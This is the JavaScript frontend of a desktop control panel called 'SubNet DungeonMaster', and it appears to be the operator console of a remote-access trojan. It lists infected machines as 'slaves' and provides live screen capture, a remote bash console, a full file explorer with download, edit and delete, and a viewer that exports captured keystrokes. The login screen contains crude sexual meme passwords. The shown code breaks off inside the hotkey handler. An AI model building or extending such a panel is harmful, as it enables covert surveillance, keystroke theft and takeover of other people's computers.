/**
 * SubNet DungeonMaster — frontend
 *
 * Python → JS:
 *   setAuthenticated, setMaximized, sendAnnounce, setSlavesTree, setInfo,
 *   setScreen(base64 [, mime]), appendBash, clearBash, setLoginError
 *   setSlaveState(items)
 *   setLocal(entries [, path])
 *   setExplorerPath(path)
 *   setExplorerFile(path, content, isImage?)
 *   setKeyLog(entries)
 *
 * JS → Python:
 *   log_in, window_*, on_slave_*, on_page_change, on_group_toggle,
 *   on_bash_command, on_screen_*, on_slaves_refresh
 *   on_state_action(id, action)
 *   on_open_folder, on_open_file, on_item_remove, on_rename, on_move,
 *   on_save_file, on_create_item, on_file_download
 *   on_slave_display_name_changed(id, displayName)
 *   on_slave_group_changed(id, group|null)
 *   on_group_rename(oldName, newName)
 *   on_group_create(name)
 *   on_group_delete(name)
 *   onReconnect()
 *   onKeyLogTimeRangeSet, onKeyLogSave
 *
 * Hotkeys (when not typing in input):
 *   1–6  switch tab (info/screen/bash/state/explorer/keylog)
 *   S    toggle slaves drawer
 *   R    reconnect
 *   Esc  close drawer / explorer viewer
 *   Ctrl+L  focus bash
 * Bash input:
 *   ↑ / ↓  command history
 */

(function () {
  'use strict';

  const $  = (sel, root = document) => root.querySelector(sel);
  const $$ = (sel, root = document) => [...root.querySelectorAll(sel)];

  function callPython(method, ...args) {
    try {
      if (window.pywebview && window.pywebview.api && typeof window.pywebview.api[method] === 'function') {
        return window.pywebview.api[method](...args);
      }
    } catch (e) {
      console.warn('[pywebview]', method, e);
    }
    console.log(`[stub] ${method}`, ...args);
    return Promise.resolve(null);
  }

  function escapeHtml(str) {
    const d = document.createElement('div');
    d.textContent = str == null ? '' : String(str);
    return d.innerHTML;
  }

  function joinPath(base, name) {
    if (!base || base === '/') return '/' + String(name).replace(/^\/+/, '');
    return base.replace(/\/+$/, '') + '/' + String(name).replace(/^\/+/, '');
  }

  function parentPath(path) {
    if (!path || path === '/') return '/';
    const parts = path.replace(/\/+$/, '').split('/');
    parts.pop();
    return parts.join('/') || '/';
  }

  const PAGE_ORDER = ['info', 'screen', 'bash', 'state', 'explorer', 'keylog'];
  const BASH_HISTORY_KEY = 'dm_bash_history';
  const BASH_HISTORY_MAX = 80;

  let currentPage = 'info';
  let activeSlaveId = null;
  let slavesTreeData = [];
  let slavesIndex = {};
  let explorerPath = '/';
  let explorerEntries = [];
  let explorerOpenPath = null;
  let cmEditor = null;
  let keylogEntries = [];
  let keylogSelected = new Set();

  let bashHistory = [];
  try {
    bashHistory = JSON.parse(localStorage.getItem(BASH_HISTORY_KEY) || '[]');
    if (!Array.isArray(bashHistory)) bashHistory = [];
  } catch (_) { bashHistory = []; }
  let bashHistoryIdx = -1;
  let bashDraft = '';

  const splash = $('#splash');
  const app = $('#app');
  const passwordInp = $('#password');
  const btnLogin = $('#btn-login');
  const loginError = $('#login-error');
  const btnSlaves = $('#btn-slaves');
  const drawer = $('#drawer');
  const drawerOverlay = $('#drawer-overlay');
  const btnDrawerClose = $('#btn-drawer-close');
  const slavesTreeEl = $('#slaves-tree');
  const tabs = $('#tabs');
  const infoGrid = $('#info-grid');
  const infoMeta = $('#info-meta');
  const infoNoSlave = $('#info-no-slave');
  const screenImg = $('#screen-img');
  const screenPlaceholder = $('#screen-placeholder');
  const dropzone = $('#screen-dropzone');
  const bashOutput = $('#bash-output');
  const bashInput = $('#bash-input');
  const activeSlaveBar = $('#active-slave-bar');
  const activeSlaveName = $('#active-slave-name');
  const activeSlaveDot = $('#active-slave-dot');
  const btnCloseSlave = $('#btn-close-slave');
  const announceContainer = $('#announce-container');
  const iconMaximize = $('#icon-maximize');
  const iconRestore = $('#icon-restore');
  const stateList = $('#state-list');
  const stateMeta = $('#state-meta');
  const stateEmpty = $('#state-empty');
  const explorerTree = $('#explorer-tree');
  const explorerPathEl = $('#explorer-path');
  const explorerFileName = $('#explorer-file-name');
  const explorerImageWrap = $('#explorer-image-wrap');
  const explorerImage = $('#explorer-image');
  const explorerEditorWrap = $('#explorer-editor-wrap');
  const explorerEditor = $('#explorer-editor');
  const explorerViewerEmpty = $('#explorer-viewer-empty');
  const btnExplorerSave = $('#btn-explorer-save');
  const btnExplorerClose = $('#btn-explorer-close-viewer');
  const btnExplorerDownload = $('#btn-explorer-download');
  const keylogList = $('#keylog-list');
  const keylogEmpty = $('#keylog-empty');
  const keylogMeta = $('#keylog-meta');
  const keylogFrom = $('#keylog-from');
  const keylogTo = $('#keylog-to');
  const btnKeylogApply = $('#btn-keylog-apply');
  const btnKeylogSave = $('#btn-keylog-save');

  function isTypingTarget(el) {
    if (!el) return false;
    const tag = (el.tagName || '').toUpperCase();
    if (tag === 'INPUT' || tag === 'TEXTAREA' || tag === 'SELECT') return true;
    if (el.isContentEditable) return true;
    if (el.closest && el.closest('.CodeMirror')) return true;
    return false;
  }

  function pushBashHistory(cmd) {
    if (!cmd) return;
    if (bashHistory[0] === cmd) return;
    bashHistory.unshift(cmd);
    if (bashHistory.length > BASH_HISTORY_MAX) bashHistory.length = BASH_HISTORY_MAX;
    try { localStorage.setItem(BASH_HISTORY_KEY, JSON.stringify(bashHistory)); } catch (_) {}
  }

  btnLogin.addEventListener('click', onLogin);
  passwordInp.addEventListener('keydown', (e) => { if (e.key === 'Enter') onLogin(); });

  function onLogin() {
    const v = (passwordInp.value || '').trim().toLowerCase().replace(/\s+/g, '');
    const secrets = {
      '300': 'Fisting is 300 bucks — noted, master',
      'billy': 'Billy Herrington has entered the dungeon',
      'van': 'Van Darkholme is watching',
      'asswecan': 'Protocol ASS-WE-CAN engaged',
      'lotion': 'It is so deep… in the logs',
    };
    if (secrets[v]) sendAnnounce(secrets[v], 'success');
    callPython('log_in', passwordInp.value);
  }

  function setLoginError(msg) {
    if (!msg) { loginError.hidden = true; loginError.textContent = ''; return; }
    loginError.textContent = msg; loginError.hidden = false;
  }

  function setAuthenticated(state) {
    if (state) { splash.hidden = true; app.hidden = false; updateNoSlaveHint(); }
    else {
      app.hidden = true; splash.hidden = false; passwordInp.value = '';
      setLoginError(null); closeSlave(false);
    }
  }

  $('#btn-minimize').addEventListener('click', () => callPython('window_minimize'));
  $('#btn-maximize').addEventListener('click', () => callPython('window_maximize'));
  $('#btn-close').addEventListener('click', () => callPython('window_close'));
  const btnSplashMin = $('#btn-splash-minimize');
  const btnSplashClose = $('#btn-splash-close');
  if (btnSplashMin) btnSplashMin.addEventListener('click', () => callPython('window_minimize'));
  if (btnSplashClose) btnSplashClose.addEventListener('click', () => callPython('window_close'));

  function setMaximized(state) {
    iconMaximize.hidden = !!state;
    iconRestore.hidden = !state;
  }

  function bindDrag(el) {
    if (!el) return;
    let startX, startY;
    el.addEventListener('mousedown', (e) => {
      if (e.button !== 0) return;
      if (e.target.closest('button, input, select, a, .no-drag')) return;
      startX = e.screenX; startY = e.screenY;
      const onMove = (ev) => {
        const dx = ev.screenX - startX, dy = ev.screenY - startY;
        startX = ev.screenX; startY = ev.screenY;
        callPython('window_move', dx, dy);
      };
      const onUp = () => {
        document.removeEventListener('mousemove', onMove);
        document.removeEventListener('mouseup', onUp);
      };
      document.addEventListener('mousemove', onMove);
      document.addEventListener('mouseup', onUp);
    });
  }
  bindDrag($('#titlebar-drag'));
  bindDrag($('#splash-drag'));

  function sendAnnounce(message, type) {
    type = type || 'info';
    const el = document.createElement('div');
    el.className = 'announce ' + type;
    el.innerHTML = '<span class="announce-msg">' + escapeHtml(message) + '</span><button class="announce-close" type="button">×</button>';
    const dismiss = () => { el.classList.add('hiding'); setTimeout(() => el.remove(), 300); };
    el.querySelector('.announce-close').addEventListener('click', dismiss);
    announceContainer.appendChild(el);
    setTimeout(dismiss, type === 'error' ? 8000 : 5000);
  }

  tabs.addEventListener('click', (e) => {
    const btn = e.target.closest('.tab');
    if (!btn) return;
    switchPage(btn.dataset.page);
  });

  function switchPage(name) {
    if (!name || name === currentPage) return;
    if (PAGE_ORDER.indexOf(name) < 0) return;
    currentPage = name;
    $$('.tab').forEach(t => t.classList.toggle('active', t.dataset.page === name));
    $$('.page').forEach(p => p.classList.toggle('active', p.id === 'page-' + name));
    callPython('on_page_change', name);
    if (name === 'bash') setTimeout(() => bashInput.focus(), 50);
    if (name === 'explorer' && cmEditor) setTimeout(() => cmEditor.refresh(), 50);
  }

  function openDrawer() { drawer.classList.add('open'); drawerOverlay.classList.add('open'); }
  function closeDrawer() { drawer.classList.remove('open'); drawerOverlay.classList.remove('open'); }
  function toggleDrawer() { drawer.classList.contains('open') ? closeDrawer() : openDrawer(); }
  btnSlaves.addEventListener('click', toggleDrawer);
  btnDrawerClose.addEventListener('click', closeDrawer);
  drawerOverlay.addEventListener('click', closeDrawer);

  const btnSlavesRefresh = $('#btn-slaves-refresh');
  if (btnSlavesRefresh) {
    btnSlavesRefresh.addEventListener('click', () => {
      btnSlavesRefresh.classList.add('spinning');
      callPython('on_slaves_refresh');
      setTimeout(() => btnSlavesRefresh.classList.remove('spinning'), 800);
    });
  }

  const btnReconnect = $('#btn-reconnect');
  function doReconnect() {
    if (!btnReconnect) {
      callPython('onReconnect');
      return;
    }
    btnReconnect.classList.add('spinning');
    callPython('onReconnect');
    setTimeout(() => btnReconnect.classList.remove('spinning'), 900);
  }
  if (btnReconnect) btnReconnect.addEventListener('click', doReconnect);

  function setSlavesTree(tree) {
    slavesTreeData = Array.isArray(tree) ? tree : [];
    rebuildIndex(slavesTreeData);
    renderSlavesTree();
    if (activeSlaveId && !slavesIndex[activeSlaveId]) closeSlave(false);
    else if (activeSlaveId) updateActiveSlaveBar(slavesIndex[activeSlaveId]);
  }

  function rebuildIndex(nodes, map) {
    map = map || {};
    slavesIndex = map;
    (nodes || []).forEach(n => {
      if (n.type === 'slave') map[n.id] = n;
      if (n.children) rebuildIndex(n.children, map);
    });
    return map;
  }

  function renderSlavesTree() {
    slavesTreeEl.innerHTML = '';
    if (!slavesTreeData.length) {
      const empty = document.createElement('div');
      empty.className = 'tree-empty';
      empty.textContent = 'Dungeon is empty';
      slavesTreeEl.appendChild(empty);
    } else {
      slavesTreeData.forEach(node => {
        slavesTreeEl.appendChild(node.type === 'group' ? renderGroup(node) : renderSlave(node, null));
      });
    }
    slavesTreeEl.classList.add('drop-root');
    slavesTreeEl.ondragover = (e) => {
      if (!e.dataTransfer.types.includes('application/x-slave-id')) return;
      e.preventDefault();
      slavesTreeEl.classList.add('drop-target');
    };
    slavesTreeEl.ondragleave = () => slavesTreeEl.classList.remove('drop-target');
    slavesTreeEl.ondrop = (e) => {
      slavesTreeEl.classList.remove('drop-target');
      const id = e.dataTransfer.getData('application/x-slave-id');
      if (!id) return;
      e.preventDefault();
      callPython('on_slave_group_changed', id, null);
    };
  }

  function renderGroup(group) {
    const el = document.createElement('div');
    el.className = 'tree-group' + (group.collapsed ? ' collapsed' : '');
    el.dataset.group = group.name;

    const header = document.createElement('div');
    header.className = 'tree-group-header';
    header.innerHTML =
      '<span class="chevron">▼</span>' +
      '<span class="group-name">' + escapeHtml(group.name) + '</span>' +
      '<span class="group-count">' + ((group.children || []).length) + '</span>' +
      '<span class="group-actions">' +
        '<button type="button" data-act="rename" title="Rename group">✎</button>' +
        '<button type="button" data-act="delete" class="danger" title="Delete group">×</button>' +
      '</span>';

    header.addEventListener('click', (e) => {
      if (e.target.closest('.group-name-input') || e.target.closest('.group-actions')) return;
      el.classList.toggle('collapsed');
      callPython('on_group_toggle', group.name, el.classList.contains('collapsed'));
    });

    const nameSpan = header.querySelector('.group-name');
    nameSpan.addEventListener('dblclick', (e) => {
      e.stopPropagation();
      startGroupRename(group, nameSpan);
    });
    header.querySelector('[data-act="rename"]').addEventListener('click', (e) => {
      e.stopPropagation();
      startGroupRename(group, nameSpan);
    });
    header.querySelector('[data-act="delete"]').addEventListener('click', (e) => {
      e.stopPropagation();
      if (!confirm('Delete group "' + group.name + '"? Slaves will be ungrouped.')) return;
      callPython('on_group_delete', group.name);
    });

    header.addEventListener('dragover', (e) => {
      if (!e.dataTransfer.types.includes('application/x-slave-id')) return;
      e.preventDefault();
      e.stopPropagation();
      header.classList.add('drop-target');
    });
    header.addEventListener('dragleave', () => header.classList.remove('drop-target'));
    header.addEventListener('drop', (e) => {
      header.classList.remove('drop-target');
      const id = e.dataTransfer.getData('application/x-slave-id');
      if (!id) return;
      e.preventDefault();
      e.stopPropagation();
      callPython('on_slave_group_changed', id, group.name);
    });

    const body = document.createElement('div');
    body.className = 'tree-group-body';
    body.addEventListener('dragover', (e) => {
      if (!e.dataTransfer.types.includes('application/x-slave-id')) return;
      e.preventDefault();
      e.stopPropagation();
      header.classList.add('drop-target');
    });
    body.addEventListener('drop', (e) => {
      header.classList.remove('drop-target');
      const id = e.dataTransfer.getData('application/x-slave-id');
      if (!id) return;
      e.preventDefault();
      e.stopPropagation();
      callPython('on_slave_group_changed', id, group.name);
    });

    (group.children || []).forEach(child => {
      body.appendChild(child.type === 'group' ? renderGroup(child) : renderSlave(child, group.name));
    });
    el.appendChild(header);
    el.appendChild(body);
    return el;
  }

  function startGroupRename(group, nameSpan) {
    if (!nameSpan || !nameSpan.parentNode) return;
    const input = document.createElement('input');
    input.className = 'group-name-input';
    input.value = group.name;
    nameSpan.replaceWith(input);
    input.focus();
    input.select();
    let done = false;
    const commit = () => {
      if (done) return;
      done = true;
      const next = input.value.trim();
      if (next && next !== group.name) {
        callPython('on_group_rename', group.name, next);
        group.name = next;
      }
      renderSlavesTree();
    };
    input.addEventListener('keydown', (e) => {
      if (e.key === 'Enter') { e.preventDefault(); commit(); }
      if (e.key === 'Escape') { done = true; renderSlavesTree(); }
    });
    input.addEventListener('blur', commit);
  }

  function renderSlave(slave, groupName) {
    const el = document.createElement('div');
    el.className = 'slave-item' + (slave.id === activeSlaveId ? ' selected' : '');
    el.dataset.id = slave.id;
    el.draggable = true;
    const pingStr = slave.ping != null ? slave.ping + ' ms' : '—';
    el.innerHTML =
      '<span class="slave-status ' + (slave.online ? 'online' : '') + '"></span>' +
      '<div class="slave-body">' +
        '<div class="slave-name-row">' +
          '<span class="slave-name">' + escapeHtml(slave.displayName || slave.id) + '</span>' +
          '<button type="button" class="btn-rename-slave" title="Rename">✎</button>' +
        '</div>' +
        '<div class="slave-meta">' +
          '<span class="id">' + escapeHtml(slave.id) + '</span>' +
          '<span>' + escapeHtml(slave.ip || '—') + '</span>' +
          '<span>' + pingStr + '</span>' +
        '</div>' +
      '</div>';

    el.addEventListener('click', (e) => {
      if (e.target.closest('.btn-rename-slave') || e.target.closest('.slave-name-input')) return;
      openSlave(slave.id);
    });
    el.addEventListener('contextmenu', (e) => {
      e.preventDefault();
      callPython('on_slave_context', slave.id, e.clientX, e.clientY);
    });

    const nameEl = el.querySelector('.slave-name');
    const startRename = (e) => {
      if (e) e.stopPropagation();
      const row = el.querySelector('.slave-name-row');
      const input = document.createElement('input');
      input.className = 'slave-name-input';
      input.value = slave.displayName || slave.id;
      nameEl.replaceWith(input);
      const btn = row.querySelector('.btn-rename-slave');
      if (btn) btn.hidden = true;
      input.focus();
      input.select();
      let done = false;
      const commit = () => {
        if (done) return;
        done = true;
        const next = input.value.trim();
        if (next && next !== (slave.displayName || slave.id)) {
          slave.displayName = next;
          callPython('on_slave_display_name_changed', slave.id, next);
          if (activeSlaveId === slave.id) updateActiveSlaveBar(slave);
        }
        renderSlavesTree();
      };
      input.addEventListener('keydown', (ev) => {
        if (ev.key === 'Enter') { ev.preventDefault(); commit(); }
        if (ev.key === 'Escape') { done = true; renderSlavesTree(); }
      });
      input.addEventListener('blur', commit);
    };
    nameEl.addEventListener('dblclick', startRename);
    el.querySelector('.btn-rename-slave').addEventListener('click', startRename);

    el.addEventListener('dragstart', (e) => {
      e.dataTransfer.setData('application/x-slave-id', slave.id);
      e.dataTransfer.effectAllowed = 'move';
      el.classList.add('dragging');
    });
    el.addEventListener('dragend', () => el.classList.remove('dragging'));

    return el;
  }

  const btnAddGroup = $('#btn-slaves-add-group');
  if (btnAddGroup) {
    btnAddGroup.addEventListener('click', () => {
      const name = prompt('Group name');
      if (!name || !name.trim()) return;
      callPython('on_group_create', name.trim());
    });
  }

  function openSlave(id) {
    const slave = slavesIndex[id];
    if (!slave) return;
    const prev = activeSlaveId;
    activeSlaveId = id;
    $$('.slave-item').forEach(s => s.classList.toggle('selected', s.dataset.id === id));
    updateActiveSlaveBar(slave);
    updateNoSlaveHint();
    if (prev !== id) {
      setInfo({}); setScreen(null); clearBash();
      appendBash('Slave ' + (slave.displayName || id) + ' joined the dungeon', 'sys');
    }
    callPython('on_slave_open', id);
  }

  function closeSlave(notify) {
    if (notify === undefined) notify = true;
    const prev = activeSlaveId;
    activeSlaveId = null;
    $$('.slave-item').forEach(s => s.classList.remove('selected'));
    activeSlaveBar.hidden = true;
    updateNoSlaveHint();
    setInfo({}); setScreen(null); clearBash();
    if (notify && prev) callPython('on_slave_close', prev);
  }

  function updateActiveSlaveBar(slave) {
    if (!slave) { activeSlaveBar.hidden = true; return; }
    activeSlaveBar.hidden = false;
    activeSlaveName.textContent = slave.displayName || slave.id;
    activeSlaveDot.classList.toggle('online', !!slave.online);
  }

  function updateNoSlaveHint() {
    const noSlave = !activeSlaveId;
    if (infoNoSlave) infoNoSlave.classList.toggle('visible', noSlave);
    infoGrid.style.display = noSlave ? 'none' : '';
    bashInput.disabled = noSlave;
    bashInput.placeholder = noSlave ? 'select a slave first, master…' : 'command…';
  }

  btnCloseSlave.addEventListener('click', () => closeSlave(true));

  function setInfo(data) {
    infoGrid.innerHTML = '';
    let entries = [];
    if (Array.isArray(data)) entries = data.map(item => [item.key, item.value]);
    else if (data && typeof data === 'object') entries = Object.entries(data);
    if (!entries.length) {
      if (activeSlaveId) {
        const empty = document.createElement('div');
        empty.className = 'info-empty';
        empty.style.gridColumn = '1 / -1';
        empty.textContent = 'No data';
        infoGrid.appendChild(empty);
      }
      infoMeta.textContent = '—';
      return;
    }
    entries.forEach(([key, value]) => {
      const card = document.createElement('div');
      card.className = 'info-card';
      card.innerHTML = '<span class="key">' + escapeHtml(key) + '</span><span class="value">' + escapeHtml(value) + '</span>';
      infoGrid.appendChild(card);
    });
    infoMeta.textContent = entries.length + ' item' + (entries.length === 1 ? '' : 's');
  }

  function setScreen(base64, mime) {
    if (!base64) {
      screenImg.hidden = true; screenImg.removeAttribute('src'); screenPlaceholder.hidden = false; return;
    }
    let src = base64;
    if (typeof base64 === 'string' && !base64.startsWith('data:')) {
      src = 'data:' + (mime || 'image/jpeg') + ';base64,' + base64.replace(/\s+/g, '');
    }
    screenImg.src = src; screenImg.hidden = false; screenPlaceholder.hidden = true;
  }

  ['dragenter', 'dragover'].forEach(ev => {
    dropzone.addEventListener(ev, (e) => { e.preventDefault(); e.stopPropagation(); dropzone.classList.add('drag-over'); });
  });
  ['dragleave', 'drop'].forEach(ev => {
    dropzone.addEventListener(ev, (e) => { e.preventDefault(); e.stopPropagation(); dropzone.classList.remove('drag-over'); });
  });
  dropzone.addEventListener('drop', (e) => {
    const files = e.dataTransfer.files;
    if (!files || !files.length) return;
    const file = files[0];
    if (!file.type.startsWith('image/')) { callPython('on_screen_drop', null, 'not_image'); return; }
    const reader = new FileReader();
    reader.onload = () => { setScreen(reader.result); callPython('on_screen_drop', reader.result, file.name); };
    reader.readAsDataURL(file);
  });

  $('#btn-screen-expand').addEventListener('click', () => callPython('on_screen_expand'));
  $('#screen-fps').addEventListener('change', (e) => callPython('on_screen_fps', Number(e.target.value)));
  $('#screen-quality').addEventListener('change', (e) => callPython('on_screen_quality', e.target.value));

  function appendBash(text, type) {
    type = type || 'out';
    const line = document.createElement('div');
    line.className = 'bash-line ' + type;
    line.textContent = text;
    bashOutput.appendChild(line);
    bashOutput.scrollTop = bashOutput.scrollHeight;
  }
  function clearBash() { bashOutput.innerHTML = ''; }

  function submitBash() {
    if (!activeSlaveId) { sendAnnounce('No slave selected, master', 'warn'); return; }
    const cmd = bashInput.value.trim();
    if (!cmd) return;
    appendBash(cmd, 'cmd');
    pushBashHistory(cmd);
    bashHistoryIdx = -1;
    bashDraft = '';
    bashInput.value = '';
    callPython('on_bash_command', cmd);
  }

  bashInput.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') {
      e.preventDefault();
      submitBash();
      return;
    }
    if (e.key === 'ArrowUp') {
      e.preventDefault();
      if (!bashHistory.length) return;
      if (bashHistoryIdx < 0) bashDraft = bashInput.value;
      if (bashHistoryIdx < bashHistory.length - 1) bashHistoryIdx++;
      bashInput.value = bashHistory[bashHistoryIdx] || '';
      return;
    }
    if (e.key === 'ArrowDown') {
      e.preventDefault();
      if (bashHistoryIdx < 0) return;
      bashHistoryIdx--;
      if (bashHistoryIdx < 0) {
        bashInput.value = bashDraft;
      } else {
        bashInput.value = bashHistory[bashHistoryIdx] || '';
      }
    }
  });

  // SLAVE STATE
  function setSlaveState(items) {
    stateList.innerHTML = '';
    const list = Array.isArray(items) ? items : [];
    stateEmpty.classList.toggle('visible', !list.length);
    stateMeta.textContent = list.length ? String(list.length) : '—';
    list.forEach((item) => {
      const el = document.createElement('div');
      el.className = 'state-item';
      const statusClass = String(item.status || '').toLowerCase().replace(/\s+/g, '-');
      const actions = (item.actions || []).map((a) => {
        const id = typeof a === 'string' ? a : a.id;
        const label = typeof a === 'string' ? a : (a.label || a.id);
        return '<button class="tool-btn" data-action="' + escapeHtml(id) + '">' + escapeHtml(label) + '</button>';
      }).join('');
      el.innerHTML = '<div class="state-item-body"><div class="state-item-name">' + escapeHtml(item.name || item.id || '—') + '</div><div class="state-item-desc">' + escapeHtml(item.description || '') + '</div></div><span class="state-item-status ' + escapeHtml(statusClass) + '">' + escapeHtml(item.status || '—') + '</span><div class="state-item-actions">' + actions + '</div>';
      el.querySelectorAll('[data-action]').forEach((btn) => {
        btn.addEventListener('click', () => callPython('on_state_action', item.id || item.name, btn.dataset.action));
      });
      stateList.appendChild(el);
    });
  }

  // EXPLORER
  function initCodeMirror() {
    if (cmEditor || typeof CodeMirror === 'undefined' || !explorerEditor) return;
    cmEditor = CodeMirror.fromTextArea(explorerEditor, {
      theme: 'material-darker', lineNumbers: true, lineWrapping: true, indentUnit: 4, mode: 'text/plain'
    });
  }
  function guessMode(path) {
    const ext = (path || '').split('.').pop().toLowerCase();
    const map = { js: 'javascript', ts: 'javascript', py: 'python', html: 'htmlmixed', htm: 'htmlmixed', css: 'css', json: 'application/json', xml: 'xml' };
    return map[ext] || 'text/plain';
  }
  function isImageName(name) { return /\.(png|jpe?g|gif|webp|bmp|svg)$/i.test(name || ''); }

  function setExplorerPath(path) {
    explorerPath = path == null || path === '' ? '/' : String(path);
    explorerPathEl.textContent = explorerPath;
  }

  function setLocal(entries, path) {
    if (path != null) setExplorerPath(path);
    explorerEntries = Array.isArray(entries) ? entries.slice() : [];
    explorerEntries.sort((a, b) => {
      if (!!a.folder !== !!b.folder) return a.folder ? -1 : 1;
      return String(a.name).localeCompare(String(b.name));
    });
    explorerPathEl.textContent = explorerPath;
    renderExplorerTree();
  }

  function renderExplorerTree() {
    explorerTree.innerHTML = '';
    if (!explorerEntries.length) {
      const empty = document.createElement('div');
      empty.className = 'tree-empty'; empty.textContent = 'Empty';
      explorerTree.appendChild(empty); return;
    }
    explorerEntries.forEach((entry) => {
      const full = joinPath(explorerPath, entry.name);
      const el = document.createElement('div');
      el.className = 'explorer-item' + (entry.folder ? ' folder' : '') + (explorerOpenPath === full ? ' selected' : '');
      el.draggable = true;
      el.innerHTML =
        '<span class="icon">' + (entry.folder ? '▣' : '▤') + '</span>' +
        '<span class="explorer-item-name">' + escapeHtml(entry.name) + '</span>' +
        '<span class="explorer-item-actions">' +
          (entry.folder ? '' : '<button type="button" data-act="download" title="Download">↓</button>') +
          '<button type="button" data-act="rename" title="Rename">✎</button>' +
          '<button type="button" data-act="remove" title="Remove">×</button>' +
        '</span>';

      el.addEventListener('click', (e) => {
        if (e.target.closest('[data-act]')) return;
        if (entry.folder) callPython('on_open_folder', full);
        else callPython('on_open_file', full);
      });

      const dl = el.querySelector('[data-act="download"]');
      if (dl) dl.addEventListener('click', (e) => {
        e.stopPropagation();
        callPython('on_file_download', full);
      });
      el.querySelector('[data-act="remove"]').addEventListener('click', (e) => {
        e.stopPropagation(); callPython('on_item_remove', full, !!entry.folder);
      });
      el.querySelector('[data-act="rename"]').addEventListener('click', (e) => {
        e.stopPropagation();
        const next = prompt('Rename to', entry.name);
        if (!next || next === entry.name) return;
        callPython('on_rename', full, joinPath(explorerPath, next));
      });

      el.addEventListener('dragstart', (e) => {
        e.dataTransfer.setData('application/x-explorer-path', full);
        e.dataTransfer.setData('application/x-explorer-folder', entry.folder ? '1' : '0');
        e.dataTransfer.effectAllowed = 'move';
        el.classList.add('dragging');
      });
      el.addEventListener('dragend', () => el.classList.remove('dragging'));

      if (entry.folder) {
        el.addEventListener('dragover', (e) => {
          if (!e.dataTransfer.types.includes('application/x-explorer-path')) return;
          e.preventDefault();
          e.stopPropagation();
          el.classList.add('drop-target');
        });
        el.addEventListener('dragleave', () => el.classList.remove('drop-target'));
        el.addEventListener('drop', (e) => {
          el.classList.remove('drop-target');
          const src = e.dataTransfer.getData('application/x-explorer-path');
          if (!src || src === full) return;
          e.preventDefault();
          e.stopPropagation();
          const baseName = src.split('/').filter(Boolean).pop();
          const dest = joinPath(full, baseName);
          callPython('on_move', src, dest);
        });
      }

      explorerTree.appendChild(el);
    });
  }

  function setExplorerFile(path, content, isImage) {
    explorerOpenPath = path;
    explorerFileName.textContent = path || '—';
    btnExplorerSave.hidden = false; btnExplorerClose.hidden = false; explorerViewerEmpty.hidden = true;
    if (btnExplorerDownload) btnExplorerDownload.hidden = false;
    const image = isImage === true || (isImage == null && isImageName(path));
    if (image) {
      explorerEditorWrap.hidden = true; explorerImageWrap.hidden = false; btnExplorerSave.hidden = true;
      let src = content || '';
      if (src && !src.startsWith('data:') && !src.startsWith('http')) src = 'data:image/png;base64,' + String(src).replace(/\s+/g, '');
      explorerImage.src = src;
    } else {
      explorerImageWrap.hidden = true; explorerEditorWrap.hidden = false;
      initCodeMirror();
      const text = content == null ? '' : String(content);
      if (cmEditor) { cmEditor.setValue(text); cmEditor.setOption('mode', guessMode(path)); setTimeout(() => cmEditor.refresh(), 30); }
      else explorerEditor.value = text;
    }
    renderExplorerTree();
  }

  function closeExplorerViewer() {
    explorerOpenPath = null; explorerFileName.textContent = '—';
    btnExplorerSave.hidden = true; btnExplorerClose.hidden = true;
    if (btnExplorerDownload) btnExplorerDownload.hidden = true;
    explorerImageWrap.hidden = true; explorerEditorWrap.hidden = true; explorerViewerEmpty.hidden = false;
    explorerImage.removeAttribute('src');
    if (cmEditor) cmEditor.setValue('');
    renderExplorerTree();
  }

  $('#btn-explorer-up').addEventListener('click', () => callPython('on_open_folder', parentPath(explorerPath)));
  $('#btn-explorer-new-file').addEventListener('click', () => {
    const name = prompt('File name'); if (!name) return;
    callPython('on_create_item', joinPath(explorerPath, name), false);
  });
  $('#btn-explorer-new-folder').addEventListener('click', () => {
    const name = prompt('Folder name'); if (!name) return;
    callPython('on_create_item', joinPath(explorerPath, name), true);
  });
  $('#btn-explorer-refresh').addEventListener('click', () => callPython('on_open_folder', explorerPath));
  btnExplorerSave.addEventListener('click', () => {
    if (!explorerOpenPath) return;
    callPython('on_save_file', explorerOpenPath, cmEditor ? cmEditor.getValue() : explorerEditor.value);
  });
  if (btnExplorerDownload) {
    btnExplorerDownload.addEventListener('click', () => {
      if (!explorerOpenPath) return;
      callPython('on_file_download', explorerOpenPath);
    });
  }
  btnExplorerClose.addEventListener('click', closeExplorerViewer);

  // KEY LOG
  function setKeyLog(entries) {
    keylogEntries = Array.isArray(entries) ? entries.slice() : [];
    keylogSelected.clear(); btnKeylogSave.disabled = true;
    renderKeyLog();
  }

  function renderKeyLog() {
    keylogList.innerHTML = '';
    keylogEmpty.classList.toggle('visible', !keylogEntries.length);
    keylogMeta.textContent = keylogEntries.length ? String(keylogEntries.length) : '—';
    if (!keylogEntries.length) return;
    const groups = {};
    keylogEntries.forEach((e, idx) => {
      const day = (e.time || '').slice(0, 10) || 'unknown';
      if (!groups[day]) groups[day] = [];
      groups[day].push({ e, idx });
    });
    Object.keys(groups).sort().forEach((day) => {
      const header = document.createElement('div');
      header.className = 'keylog-date'; header.textContent = day;
      keylogList.appendChild(header);
      groups[day].forEach(({ e, idx }) => {
        const row = document.createElement('div');
        row.className = 'keylog-item' + (keylogSelected.has(idx) ? ' selected' : '');
        const timeStr = (e.time || '').includes('T') ? (e.time.split('T')[1] || e.time).slice(0, 12) : (e.time || '');
        row.innerHTML = '<input type="checkbox" ' + (keylogSelected.has(idx) ? 'checked' : '') + ' /><span class="keylog-time">' + escapeHtml(timeStr) + '</span><span class="keylog-key">' + escapeHtml(e.key) + '</span>';
        const cb = row.querySelector('input');
        const toggle = () => {
          if (keylogSelected.has(idx)) keylogSelected.delete(idx); else keylogSelected.add(idx);
          row.classList.toggle('selected', keylogSelected.has(idx));
          cb.checked = keylogSelected.has(idx);
          btnKeylogSave.disabled = keylogSelected.size === 0;
        };
        row.addEventListener('click', (ev) => { if (ev.target !== cb) toggle(); });
        cb.addEventListener('change', toggle);
        keylogList.appendChild(row);
      });
    });
  }

  btnKeylogApply.addEventListener('click', () => {
    callPython('onKeyLogTimeRangeSet', keylogFrom.value || null, keylogTo.value || null);
  });
  btnKeylogSave.addEventListener('click', () => {
    const keys = [...keylogSelected].sort((a, b) => a - b).map((i) => keylogEntries[i]);
    callPython('onKeyLogSave', keys);
  });

  // ─── HOTKEYS ───────────────────────────────────────────────
  document.addEventListener('keydown', (e) => {
    // Esc always works
    if (e.key === 'Escape') {
      if (drawer.classList.contains('open')) { closeDrawer(); e.preventDefault(); return; }
